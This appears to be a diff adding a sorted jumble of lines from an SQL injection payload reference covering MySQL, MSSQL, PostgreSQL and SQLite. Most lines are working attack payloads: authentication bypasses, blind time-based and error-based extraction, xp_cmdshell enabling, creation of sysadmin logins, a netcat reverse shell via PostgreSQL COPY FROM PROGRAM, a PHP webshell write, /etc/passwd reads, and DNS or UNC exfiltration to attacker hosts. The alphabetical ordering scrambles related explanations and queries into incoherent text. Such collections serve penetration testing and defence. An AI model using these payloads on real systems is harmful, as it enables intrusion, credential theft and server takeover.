@@ -1,0 +1,1049 @@
+ or 1=1 --
+!
+" "
+" #
+" --
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+" False
+" OR "" = "
+" OR 1 = 1 -- -
+" or "" "
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""="
+" or ""^"
+" or "1"="1
+" or "1"="1"#
+" or "1"="1"--
+" or "1"="1"/*
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 0=0 –
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1#
+" or 1=1--
+" or 1=1/*
+" or 1=1–
+" or benchmark(10000000,MD5(1))#
+" or isNULL(1/0) /*
+" or sleep(__TIME__)#
+" or true--
+"" True
+"&"
+") or "1"="1
+") or "1"="1"#
+") or "1"="1"--
+") or "1"="1"/*
+") or ("1"="1
+") or ("1"="1"#
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("a"="a
+") or ("x")=("x
+") or pg_sleep(__TIME__)--
+") or true--
+")) or (("x"))=(("x
+")) or benchmark(10000000,MD5(1))#
+"));waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+"*"
+"-"
+"/*
+";waitfor delay '0:0:__TIME__'--
+"^"
+"or 1=1 or ""="
+$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
+$ SELECT name FROM master..sysdatabases
+$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
+$ mysql -u root -p mysql
+$ whereis lib_mysqludf_sys.so
+$$ language plpgsql security definer;
+$id=check_addslashes($_GET['id']);
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+$string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+$string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+%' or '0'='0
+%20$(sleep%2050)
+%20'sleep%2050'
+%20or%20''='
+%20or%20'x'='x
+%20or%201=1
+%20or%20x=x
+%27%20or%201=1
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+%8C%A8%27 OR 1=1--
+%A8%27 OR 1=1;--
+%bf' OR 1=1 -- --
+&
+&apos;%20OR
+'
+' #
+' '
+' 'DERP
+' (select top 1
+' + cast((SELECT @@version) as int) + '
+' + convert(int,@@version) + '
+' --
+' ; WAITFOR DELAY '00:00:05' --
+' AND '1'='1' AND SLEEP(5)
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
+' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
+' AND SLEEP(5)/*
+' False
+' OR '1
+' OR '1'='1
+' OR 'x'='x'#;
+' OR 1 -- -
+' UNION ALL SELECT
+' UNION ALL SELECT 1, @@version;#
+' UNION ALL SELECT system_user(),user();#
+' UNION SELECT
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+' and 'one'='one
+' and 'one'='one–
+' and 1='1
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and a='a
+' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
+' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
+' and substring(password/text(),1,1)='7
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' or         0=0 #
+' or '' '
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' or '1'='1
+' or '1'='1'#
+' or '1'='1'--
+' or '1'='1'/*
+' or '1′='1
+' or 'a'='a
+' or 'one'='one
+' or 'one'='one–
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 0=0 –
+' or 1 --'
+' or 1=1
+' or 1=1 --
+' or 1=1 LIMIT 1;#
+' or 1=1 limit 1 --
+' or 1=1 limit 1 -- -+
+' or 1=1 or ''='
+' or 1=1 –
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' or 1=1;#
+' or 1=1–
+' or 3=3
+' or 3=3 --
+' or a=a--
+' or a=a–
+' or true--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+' union select 0x2720756e696f6e2073656c65637420312c3223#
+' –
+'#
+'%20'HERP
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+'%2B'HERP
+'&'
+'' True
+') or '1'='1
+') or '1'='1'#
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1--
+') or ('1'='1
+') or ('1'='1'#
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1--
+') or ('a'='a
+') or ('a'='a and hi") or ("a"="a
+') or ('x')=('x
+') or ('x'='x
+') or true--
+')%20or%20('x'='x
+')) or (('x'))=(('x
+'*'
+'+'herp
+'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
+'+BENCHMARK(3200,SHA1(1))+'
+'-'
+'--
+'/*
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+'="or')%20or%20('x'='x
+'='
+'=' 'or' and '=' 'or'
+'=0--+
+'LIKE'
+'^'
+'hi' or 'x'='x';
+'or 1=1 or ''='
+'or'1=1
+'or'1=1′
+'sqlattempt1
+'||'DERP
+'||UTL_HTTP.REQUEST
+(
+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+(select top 1
+(sqlattempt2)
+(sqlvuln)
+(||6)
+)
+) or '1′='1–
+) or ('1′='1–
+) or ('a'='a
+) or (a=a
+) or benchmark(10000000,MD5(1))#
+) or benchmark(10000000,MD5(1))#"
+) or pg_sleep(__TIME__)--
+) or sleep(__TIME__)=
+) or sleep(__TIME__)='
+) union select * from information_schema.tables;
+)) or benchmark(10000000,MD5(1))#
+)) or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)--"
+)) or sleep(__TIME__)="""
+)) or sleep(__TIME__)='
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+* MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
+* Simple characters: `'`, `"`, `;`, `)` and `*`
+* [Alternative to GROUP_CONCAT](#alternative-to-group_concat)
+* [Alternative to Information Schema](#alternative-to-information-schema)
+* [Alternative to Quotes](#alternative-to-quotes)
+* [Alternative to VERSION](#alternative-to-version)
+* [Attach Database](#attach-database)
+* [Blind Error Based Injection](#blind-error-based-injection)
+* [Boolean Based Injection](#boolean-based-injection)
+* [COMMAND - UDF Library](#command---udf-library)
+* [Case Modification](#case-modification)
+* [Conditional Comments](#conditional-comments)
+* [DNS Exfiltration](#dns-exfiltration)
+* [Detect Columns Number](#detect-columns-number)
+* [Extract Columns Name Without Information_Schema](#extract-columns-name-without-information_schema)
+* [Extract Data Without Columns Name](#extract-data-without-columns-name)
+* [Extract Database With Information_schema](#extract-database-with-information_schema)
+* [Iterative NULL Method](#iterative-null-method)
+* [LIMIT INTO Method](#limit-into-method)
+* [Load_extension](#load_extension)
+* [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)
+* [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)
+* [MSSQL List Columns](#mssql-list-columns)
+* [MSSQL List Databases](#mssql-list-databases)
+* [MSSQL List Permissions](#mssql-list-permissions)
+* [MSSQL List Tables](#mssql-list-tables)
+* [MSSQL Make User DBA](#mssql-make-user-dba)
+* [MSSQL Read File](#mssql-read-file)
+* [MSSQL UNC Path](#mssql-unc-path)
+* [MSSQL Write File](#mssql-write-file)
+* [MYSQL Blind Using A Conditional Statement](#mysql-blind-using-a-conditional-statement)
+* [MYSQL Blind With LIKE](#mysql-blind-with-like)
+* [MYSQL Blind With MAKE_SET](#mysql-blind-with-make_set)
+* [MYSQL Blind With Substring Equivalent](#mysql-blind-with-substring-equivalent)
+* [MYSQL Error Based - Basic](#mysql-error-based---basic)
+* [MYSQL Error Based - Extractvalue Function](#mysql-error-based---extractvalue-function)
+* [MYSQL Error Based - UpdateXML Function](#mysql-error-based---updatexml-function)
+* [MySQL Blind With REGEXP](#mysql-blind-with-regexp)
+* [No Comma Allowed](#no-comma-allowed)
+* [No Equal Allowed](#no-equal-allowed)
+* [ORDER BY Method](#order-by-method)
+* [Out of Band (OAST)](#out-of-band-oast)
+* [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)
+* [PostgreSQL File Read](#postgresql-file-read)
+* [PostgreSQL File Write](#postgresql-file-write)
+* [PostgreSQL List Privileges](#postgresql-list-privileges)
+* [PostgreSQL Superuser Role](#postgresql-superuser-role)
+* [PostgreSQL XML Helpers](#postgresql-xml-helpers)
+* [Python Script](#python-script)
+* [Raw MD5 and SHA1](#raw-md5-and-sha1)
+* [SQLite Blind Methodology](#sqlite-blind-methodology)
+* [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
+* [SQLite Read File](#sqlite-read-file)
+* [SQLite String Methodology](#sqlite-string-methodology)
+* [SQLite Write File](#sqlite-write-file)
+* [Scientific Notation](#scientific-notation)
+* [Time Based Injection](#time-based-injection)
+* [UNC Path - NTLM Hash Stealing](#unc-path---ntlm-hash-stealing)
+* [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
+* [Using Conditional Statements](#using-conditional-statements)
+* [Using SLEEP in a Subselect](#using-sleep-in-a-subselect)
+* [Using libc.so.6](#using-libcso6)
+* [WEBSHELL - DUMPFILE method](#webshell---dumpfile-method)
+* [WEBSHELL - OUTFILE method](#webshell---outfile-method)
+* [White Spaces](#white-spaces)
+* [Wide Byte Injection (GBK)](#wide-byte-injection-gbk)
+* [XP_CMDSHELL](#xp_cmdshell)
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
++-----------+-----------------------------------------------------------------+
++----------------+
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
++------------------+
++-------------------------+
++--------------------------------------------------+
++BENCHMARK(40000000,SHA1(1337))+
+,@variable
+--
+-- &password=
+-- 'sp_password' was found in the text of this event.
+-- (Only works in MSSQL 2017+)
+-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb
+-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
+-- Enable advanced options
+-- Enable xp_cmdshell
+-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
+-- The text has been replaced with this comment for security reasons.
+-- chain multiple openquery
+-- create user and give admin privileges
+-- execute query through the link
+-- execute shell commands
+-- find link
+-- for N = 0, 1, 2, …
+-- for the current DB only
+-- list column names and types for master..sometable
+-- multiple SELECT statements
+-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
+-- updating password with a stacked query
+-- use xtype = 'V' for views
+-- using the stacked query to enable xp_cmdshell
+-- you won't have the output of the query, redirect it to a file
+-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
+-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
+...
+/
+/**/or/**/1/**/=/**/1
+//
+//*
+/usr/lib/lib_mysqludf_sys.so
+0
+0 or 1=1
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
+1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
+1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
+1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+1 or 1=1
+1 or benchmark(10000000,MD5(1))#
+1 or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1 waitfor delay '0:0:10'--
+1' UNION SELECT username, password FROM users --
+1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--
+1) or benchmark(10000000,MD5(1))#
+1) or pg_sleep(__TIME__)--
+1) or sleep(__TIME__)#
+1)) or benchmark(10000000,MD5(1))#
+1)) or pg_sleep(__TIME__)--
+1)) or sleep(__TIME__)#
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1; EXEC xp_cmdshell('whoami') --
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;SELECT%20*
+1′) and '1′='1–
+21%
+2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+23 OR 1=1
+26 %
+26%
+28%
+29 %
+29%
+3.10E+17
+:warning: Don't forget to escape the '\\\\'.
+:warning: The 2 SELECT clauses must have the same number of columns.
+; begin declare @var varchar(8000) set @var=' ...
+; exec ('sel' + 'ect us' + 'er')
+; exec master..xp_cmdshell
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec xp_regread
+; execute immediate 'sel' || 'ect us' || 'er'
+; or '1'='1'
+;(select 1 from pg_sleep(5))
+;waitfor delay '0:0:__TIME__'--
+<>"'%;)(&+
+=
+==
+> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.
+> MySQL Injection  is a type of security vulnerability that occurs when an attacker is able to manipulate the SQL queries made to a MySQL database by injecting malicious input. This vulnerability is often the result of improperly handling user input, allowing attackers to execute arbitrary SQL code that can compromise the database's integrity and security.
+> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.
+?
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
+?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+@var select @var as var into temp end --
+@variable
+Ã½ or 1=1 --
+AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
+AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
+AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
+AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
+AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
+AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
+AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
+AND SLEEP(10)=0
+AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
+AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
+AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+ATTACH DATABASE '/var/www/lol.php' AS lol;
+An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.
+Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.
+BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
+BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
+BENCHMARK(2000000,MD5(NOW()))
+Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to "P@ssw0rd". After this, we can simply authenticate with "`admin@example.com`" and the password "P@ssw0rd".
+Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response.
+CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
+CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
+CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
+COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
+COPY nc(t) TO '/tmp/nc.sh';
+COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
+COPY temp FROM '/etc/passwd';
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+CREATE TABLE lol.pwn (dataz text);
+CREATE TABLE nc (t TEXT);
+CREATE TABLE shell(output text);
+CREATE TABLE temp(t TEXT);
+END;
+ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
+EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+EXEC sp_configure 'show advanced options',1;
+EXEC sp_configure 'xp_cmdshell',1;
+EXEC xp_cmdshell "net user";
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
+EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
+EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
+EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+Enter password: [...]
+For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
+Here's a breakdown of how the wide byte injection works:
+Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.
+However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`.
+IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
+IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
+INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
+INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
+INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "BCRYPT_HASH"), ("admin@example.com", "P@ssw0rd") ON DUPLICATE KEY UPDATE password="P@ssw0rd" -- ", "BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT");
+If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.
+In MYSQL "`admin`" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
+In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.
+In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.
+In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.
+In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.
+In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for SQL injection.
+In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.
+In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.
+Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.
+LIMIT CAST((SELECT version()) as numeric)
+LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+Let's assume a vulnerable web application retrieves product details based on a product ID from a database:
+Let's see a basic example to recover the version of the database using a time based sql injection.
+MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.
+Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
+OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
+OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
+Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.
+PRINT
+PRINT @@variable
+Payload: `username = "admin               a"`
+ProductID=1');waitfor delay '0:0:10'--
+ProductID=1';waitfor delay '0:0:10'--
+ProductID=1));waitfor delay '0:0:10'--
+ProductID=1);waitfor delay '0:0:10'--
+ProductID=1; DROP members--
+ProductID=1;waitfor delay '0:0:10'--
+RECONFIGURE;
+RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
+RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
+RESTORE LABELONLY FROM DISK = '\\attackerip\file'
+RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
+RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
+RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
+RLIKE SLEEP([SLEEPTIME])
+SELECT  UserId, UserName from Users
+SELECT '' INTO DUMPFILE '\\\\error\\abc';
+SELECT '' INTO OUTFILE '\\\\error\\abc';
+SELECT 'A'SELECT 'B'SELECT 'C'
+SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
+SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
